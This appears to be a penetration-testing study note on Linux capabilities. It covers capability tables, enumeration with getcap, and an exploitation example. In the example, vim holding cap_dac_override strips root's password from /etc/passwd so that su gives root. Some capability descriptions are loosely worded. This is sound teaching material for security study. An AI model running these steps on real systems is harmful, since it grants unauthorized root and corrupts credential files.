
## Capabilities and values


| **Capability**         | **Description**                                                                                                                                           |
| ---------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_sys_chroot`       | Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.            |
| `cap_sys_ptrace`       | Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes. |
| `cap_sys_nice`         | Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.               |
| `cap_sys_time`         | Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.                |
| `cap_sys_resource`     | Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.       |
| `cap_sys_module`       | Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.      |
| `cap_net_bind_service` | Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.                         |
| `cap_setuid`           | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                       |
| `cap_setgid`           | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                              |
| `cap_dac_override`     | Allows bypassing of file read, write, and execute permission checks.                                                                                      |
| `cap_sys_admin`        | Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.                                     |

|**Capability Values**|**Description**|
|---|---|
|`=`|This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.|
|`+ep`|This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.|
|`+ei`|This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.|
|`+p`|This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.|

## Sudo level Capabilities

| **Capability**     | **Description**                                                                                                                                                                                                              |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `cap_setuid`       | Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the `root` user.                                                                                          |
| `cap_setgid`       | Allows to set its effective group ID, which can be used to gain the privileges of another group, including the `root` group.                                                                                                 |
| `cap_sys_admin`    | This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the `root` user, such as modifying system settings and mounting and unmounting file systems. |
| `cap_dac_override` | Allows bypassing of file read, write, and execute permission checks.                                                                                                                                                         |

Setting up capabilities:
```sh
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic 
```

---
## Enumeration

```sh
find / -type f -exec getcap {} \;

find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \; ### refined version
```

---
## Exploitation Example

In case we have a binary with `cap_dac_override` capability e.g. `/usr/bin/vim` then we can use this binary to modify a system file:

```sh
/usr/bin/vim.basic /etc/passwd
```

We also can make these changes in a non-interactive mode:

```sh
> echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd 

> cat /etc/passwd | head -n1 
  root::0:0:root:/root:/bin/bash
```

Now, we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.

---